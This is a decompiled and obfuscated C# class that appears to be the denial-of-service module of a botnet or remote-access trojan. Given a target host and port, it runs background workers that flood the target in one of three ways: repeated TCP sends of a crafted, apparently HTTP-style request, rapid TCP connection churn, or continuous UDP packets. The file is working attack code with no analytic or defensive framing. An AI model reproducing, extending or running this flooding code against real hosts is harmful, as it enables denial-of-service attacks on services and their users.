using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ns6;

namespace ns2;

internal class Class2
{
	private delegate void Delegate0(object sender, DoWorkEventArgs e);

	public enum Enum0
	{
		const_0,
		const_1,
		const_2
	}

	private static Delegate0 delegate0_0;

	private static IPEndPoint ipendPoint_0;

	private static byte[] byte_0;

	private static uint uint_0 = 2u;

	private static BackgroundWorker[] backgroundWorker_0;

	public static void smethod_0(Enum0 enum0_0, string[] string_0)
	{
		smethod_1();
		string text = Convert.ToString(string_0[0]);
		ushort port = Convert.ToUInt16(string_0[1]);
		string empty = string.Empty;
		switch (enum0_0)
		{
		case Enum0.const_0:
			empty = ((string_0.Length >= 3) ? Convert.ToString(string_0[2]) : _003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_13());
			byte_0 = Encoding.ASCII.GetBytes(string.Format(_003CPrivateImplementationDetails_003E_007B0FEE17AE_002DBF48_002D4D24_002DA538_002D55E3AAA64C27_007D.smethod_14(), text, empty, Class13.string_4, VG.random_0.Next(200, 300), Environment.NewLine));
			delegate0_0 = smethod_2;
			break;
		case Enum0.const_1:
			byte_0 = null;
			delegate0_0 = smethod_3;
			break;
		case Enum0.const_2:
			byte_0 = new byte[256];
			delegate0_0 = smethod_4;
			break;
		}
		try
		{
			ipendPoint_0 = new IPEndPoint(Dns.GetHostEntry(text).AddressList[0], port);
		}
		catch
		{
			ipendPoint_0 = new IPEndPoint(IPAddress.Parse(text), port);
		}
		backgroundWorker_0 = new BackgroundWorker[uint_0];
		for (int i = 0; i < uint_0; i++)
		{
			backgroundWorker_0[i] = new BackgroundWorker();
			backgroundWorker_0[i].DoWork += delegate0_0.Invoke;
			backgroundWorker_0[i].WorkerSupportsCancellation = true;
			backgroundWorker_0[i].RunWorkerAsync();
		}
	}

	public static void smethod_1()
	{
		try
		{
			for (int i = 0; i < uint_0; i++)
			{
				backgroundWorker_0[i].CancelAsync();
				backgroundWorker_0[i].Dispose();
			}
			backgroundWorker_0 = null;
			ipendPoint_0 = null;
		}
		catch
		{
		}
	}

	private static void smethod_2(object sender, DoWorkEventArgs e)
	{
		while (!(sender as BackgroundWorker).CancellationPending)
		{
			try
			{
				Socket socket = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
				socket.ReceiveTimeout = 10;
				using Socket socket2 = socket;
				try
				{
					socket2.Connect(ipendPoint_0);
				}
				catch
				{
					goto end_IL_001f;
				}
				socket2.Send(byte_0);
				goto IL_004c;
				end_IL_001f:;
			}
			catch
			{
				goto IL_004c;
			}
			continue;
			IL_004c:
			Thread.Sleep(30);
		}
	}

	private static void smethod_3(object sender, DoWorkEventArgs e)
	{
		while (!(sender as BackgroundWorker).CancellationPending)
		{
			try
			{
				using Socket socket = new Socket(ipendPoint_0.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
				socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, optionValue: true);
				socket.BeginConnect(ipendPoint_0, smethod_5, socket);
			}
			catch
			{
			}
			Thread.Sleep(50);
		}
	}

	private static void smethod_4(object sender, DoWorkEventArgs e)
	{
		Socket socket = new Socket(ipendPoint_0.AddressFamily, SocketType.Dgram, ProtocolType.Udp);
		while (!(sender as BackgroundWorker).CancellationPending)
		{
			try
			{
				socket.SendTo(byte_0, ipendPoint_0);
			}
			catch
			{
			}
			Thread.Sleep(50);
		}
	}

	private static void smethod_5(IAsyncResult iasyncResult_0)
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			((Socket)iasyncResult_0.AsyncState).Close();
		}
		catch
		{
		}
	}
}
